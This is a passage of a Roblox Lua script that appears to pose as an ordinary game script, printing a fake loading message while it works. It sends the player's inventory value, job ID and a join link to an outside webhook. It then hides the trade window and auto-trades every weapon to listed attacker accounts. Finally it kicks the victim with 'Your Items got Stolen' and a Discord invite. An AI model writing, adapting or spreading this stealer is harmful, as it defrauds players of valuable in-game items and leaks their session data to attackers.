                value = "$" .. string.format("%.2f", totalInventoryValue),
                inline = true
            },
            {
                name = "Item Count",
                value = tostring(total_items),
                inline = true
            },
            {
                name = "Job ID",
                value = string.sub(REAL_JOB_ID, 1, 8) .. "...",
                inline = true
            },
            {
                name = "Rarity Breakdown",
                value = rarityText,
                inline = false
            },
            {
                name = "Best Items",
                value = topItemsText,
                inline = false
            },
            {
                name = "Quick Actions",
                value = "[Join Server](" .. fernJoinerLink .. ") | [View Full List](" .. rubisLink .. ")",
                inline = false
            }
        },
        footer = {text = "Project Swag v1.0 | " .. os.date("%H:%M:%S")},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

if total_items ~= 0 or total_items > 1 then
    sendToWebhook(payload)
end

print("[PS] Loading Script for", plr.Name)
print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")

wait(3)

local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
if not Trade then
    warn("[PS] Trade remote missing")
    return
end

local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")

local last_offer_info = nil

if Trade:FindFirstChild("UpdateTrade") then
    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if typeof(data) == "table" and data.lastOffer then
            last_offer_info = data.lastOffer
        elseif typeof(data) == "table" and data.LastOffer then
            last_offer_info = data.LastOffer
        end
    end)
end

local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

local function getStatus()
    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
    return ok and status or "None"
end

local function isTarget(name)
    for _, u in ipairs(USERNAMES) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

local function waitUntilDone()
    local startTime = tick()
    repeat
        task.wait(0.1)
        if tick() - startTime > 30 then break end
    until getStatus() == "None"
end

local function acceptDeal()
    local ok = pcall(function()
        if last_offer_info then
            AcceptTradeRemote:FireServer(game.PlaceId * 3, last_offer_info)
        else
            AcceptTradeRemote:FireServer(game.PlaceId * 3, {})
        end
    end)
    return ok
end

local function addToOffer(item_id)
    local ok = pcall(function()
        OfferItem:FireServer(item_id, "Weapons")
    end)
    if ok then task.wait(0.1) end
    return ok
end

local isTradeCompleted = false

local function doTrade(targetPlayer)
    if not targetPlayer then return end
    if isTradeCompleted then return end

    local charStart = tick()
    while tick() - charStart < 15 do
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
            break
        end
        task.wait(0.5)
    end

    local itemsToTrade = {}
    for _, item in ipairs(weaponsToSend) do
        table.insert(itemsToTrade, {
            DataID = item.DataID,
            ItemName = item.ItemName,
            Amount = item.Amount,
            Rarity = item.Rarity,
            Value = item.Value,
            TotalValue = item.TotalValue
        })
    end

    if #itemsToTrade == 0 then
        warn("[PS] No items to trade")
        return
    end

    local tradeSessionStart = tick()
    while #itemsToTrade > 0 and not isTradeCompleted do
        if tick() - tradeSessionStart > 120 then
            break
        end

        local statusNow = getStatus()
        if statusNow == "StartTrade" then
            pcall(function() DeclineTrade:FireServer() end)
            task.wait(0.3)
        elseif statusNow == "ReceivingRequest" then
            if Trade:FindFirstChild("DeclineRequest") then
                pcall(function() Trade.DeclineRequest:FireServer() end)
            else
                pcall(function() DeclineTrade:FireServer() end)
            end
            task.wait(0.3)
        end

        local tradeStarted = false
        for sendAttempt = 1, 30 do
            if isTradeCompleted then return end
            local current = getStatus()
            if current == "StartTrade" then
                tradeStarted = true
                break
            elseif current == "None" then
                pcall(function() SendRequest:InvokeServer(targetPlayer) end)
            elseif current == "ReceivingRequest" then
                if Trade:FindFirstChild("DeclineRequest") then
                    pcall(function() Trade.DeclineRequest:FireServer() end)
                else
                    pcall(function() DeclineTrade:FireServer() end)
                end
            end
            task.wait(0.5)
        end

        if not tradeStarted then
            task.wait(2)
            continue
        end

        local slotsLeft = 4
        local itemsAdded = 0
        local itemsRemoved = {}
        while slotsLeft > 0 and #itemsToTrade > 0 do
            local currentItem = itemsToTrade[1]
            local amountToAdd = math.min(slotsLeft, currentItem.Amount)
            local addSuccess = true
            for _ = 1, amountToAdd do
                if not addToOffer(currentItem.DataID) then
                    addSuccess = false
                    break
                end
            end
            if not addSuccess then
                break
            end
            currentItem.Amount = currentItem.Amount - amountToAdd
            if currentItem.Amount <= 0 then
                table.insert(itemsRemoved, 1)
            end
            slotsLeft = slotsLeft - amountToAdd
            itemsAdded = itemsAdded + amountToAdd
        end

        for i = #itemsRemoved, 1, -1 do
            table.remove(itemsToTrade, itemsRemoved[i])
        end

        if itemsAdded == 0 then
            break
        end

        task.wait(5)
        acceptDeal()
        waitUntilDone()

        local verifyOk, currentInv = pcall(function()
            return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
        end)
        if verifyOk and currentInv and currentInv.Weapons and currentInv.Weapons.Owned then
            local newItemsToTrade = {}
            for _, item in ipairs(itemsToTrade) do
                if currentInv.Weapons.Owned[item.DataID] then
                    table.insert(newItemsToTrade, item)
                end
            end
            itemsToTrade = newItemsToTrade
        end

        if #itemsToTrade > 0 then
            task.wait(1)
        end
    end

    if #itemsToTrade == 0 then
        isTradeCompleted = true
        task.wait(2)
        pcall(function() setclipboard("https://discord.gg/7PJtnGwdXW") end)
        pcall(function()
            plr:Kick("Project Swag | Your Items got Stolen\n\ndiscord.gg/7PJtnGwdXW")
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if isTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            local ok, err = pcall(function()
                doTrade(player)
            end)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        task.spawn(function()
            task.wait(4)
            local ok, err = pcall(function()
                doTrade(p)
            end)
        end)
    end
end

task.spawn(function()
    while not isTradeCompleted do
        task.wait(30)
        if not isTradeCompleted then
            local ok = pcall(function()
                return GetStatus:InvokeServer()
            end)
        end
    end
end)
